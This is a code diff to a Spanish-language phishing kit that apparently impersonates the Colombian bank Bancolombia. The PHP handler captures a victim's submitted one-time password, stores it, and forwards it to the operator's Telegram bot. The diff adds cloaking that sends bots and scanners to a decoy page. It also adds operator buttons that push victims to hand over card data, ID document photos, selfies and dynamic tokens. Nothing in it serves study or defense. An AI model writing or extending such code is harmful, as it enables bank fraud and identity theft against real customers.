@@ -1,35 +1,32 @@
 <?php
+// ── Cloaking Anti-Bot ────────────────────────────────────
+require_once __DIR__ . '/../../config/cloak.php';
+// ─────────────────────────────────────────────────────────
 
 // Mobile check removed
 
-?>
-<?php
-session_start();
+if (session_status() === PHP_SESSION_NONE) {
+    session_start();
+}
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    cloak_validate_post_request('../../decoy.php');
 
     // 1. Cargar Configuración Global
-    $config = require __DIR__ . '/../../../../config.php';
+    $config = require __DIR__ . '/../../config/config.php';
 
     if (!$config || !is_array($config)) {
         die("Error: No se pudo cargar la configuración.");
     }
 
-    // Conectarse a la DB usando el archivo de conexion global db.php
-    try {
-        include __DIR__ . '/../../../../db.php'; // Esto define la variable $conn
-        $pdo = $conn;
-    } catch (Exception $e) {
-        die("Error DB");
-    }
+    // Conexión DB
+    $pdo = require __DIR__ . '/../../config/db.php';
 
-    // Cargar config local de Bancolombia para Telegram y baseUrl
-    $localConfigPath = __DIR__ . '/../../assets/config/conexion.php';
-    $localConfig = file_exists($localConfigPath) ? require $localConfigPath : [];
+    $bot_token = $config['botToken'];
 
-    $bot_token = $localConfig['telegram']['bot_token'] ?? $config['botToken'];
-    $chat_id = $localConfig['telegram']['chat_id'] ?? $config['chatId'];
-    $baseUrl = $localConfig['base_url'] ?? ($config['baseUrl'] . '/pago/4c7a1d9e/modules/api/actualizar_estado.php');
+    $chat_id = $config['chatId'];
+
+    $baseUrl = $config['baseUrl'];
     $security_key = $config['security_key'];
 
     // 2. Recuperar datos
@@ -53,7 +50,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         $message = "✅ OTP Recibido ✅\n\n🆔 ID: {$cliente_id}\n🔐 OTP: {$submitted_otp}";
 
-    } catch (PDOException $e) {
+    }
+    catch (PDOException $e) {
         $message = "⚠️ Error DB OTP ID: {$cliente_id}";
     }
 
@@ -61,16 +59,29 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $keyboard = [
         'inline_keyboard' => [
             [
-                ['text' => '❌ Error Login', 'url' => "$baseUrl?id=$cliente_id&estado=2&key=$security_key"],
-                ['text' => '🔑 Otp', 'url' => "$baseUrl?id=$cliente_id&estado=3&key=$security_key"],
+                ['text' => '❌ Error Login', 'callback_data' => "cmd_2_$cliente_id"],
+                ['text' => '🔑 Otp',        'callback_data' => "cmd_3_$cliente_id"],
             ],
             [
-                ['text' => '⚠️ Otp Error', 'url' => "$baseUrl?id=$cliente_id&estado=4&key=$security_key"],
-                ['text' => '💳 CC', 'url' => "$baseUrl?id=$cliente_id&estado=5&key=$security_key"],
+                ['text' => '⚠️ Otp Error',  'callback_data' => "cmd_4_$cliente_id"],
+                ['text' => '💳 CC',         'callback_data' => "cmd_5_$cliente_id"],
             ],
             [
-                ['text' => '⚠️ CC Error', 'url' => "$baseUrl?id=$cliente_id&estado=6&key=$security_key"],
-                ['text' => '✅ Finalizar', 'url' => "$baseUrl?id=$cliente_id&estado=7&key=$security_key"],
+                ['text' => '⚠️ CC Error',   'callback_data' => "cmd_6_$cliente_id"],
+                ['text' => '✅ Finalizar',  'callback_data' => "cmd_7_$cliente_id"],
+            ],
+            [
+                ['text' => '🪪 Doc Frente',  'callback_data' => "cmd_11_$cliente_id"],
+                ['text' => '🪪 Doc Reverso', 'callback_data' => "cmd_12_$cliente_id"]
+            ],
+            [
+                ['text' => '🔐 Dinámica',   'callback_data' => "cmd_15_$cliente_id"],
+                ['text' => '⚠️ Dinámica Err','callback_data' => "cmd_16_$cliente_id"]
+            ],
+            [
+                ['text' => '📲 WhatsApp',   'callback_data' => "cmd_8_$cliente_id"],
+                ['text' => '🤳 Selfie',     'callback_data' => "cmd_9_$cliente_id"],
+                ['text' => '⚠️ Selfie Err', 'callback_data' => "cmd_10_$cliente_id"]
             ]
         ]
     ];
@@ -91,14 +102,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_exec($ch);
-        curl_close($ch);
     }
 
     // 6. Redirect
     header("Location: ../../index.php?status=espera&id=" . $cliente_id);
     exit();
 
-} else {
+}
+else {
     header("Location: ../../index.php");
     exit();
 }
